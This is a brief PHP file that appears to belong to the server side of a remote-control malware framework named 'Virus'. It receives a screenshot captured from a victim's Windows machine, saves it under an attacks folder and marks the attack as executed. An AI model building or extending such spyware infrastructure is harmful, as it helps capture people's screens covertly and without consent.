<?php

use Kelvinho\Virus\Attack\Packages\Windows\OneTime\Screenshot;

/** @var Screenshot $this */

$this->requestData->moveFile("screenshot", DATA_FILE . "/attacks/" . $this->getAttackId() . "/screen.png");
$this->setExecuted();
$this->saveState();
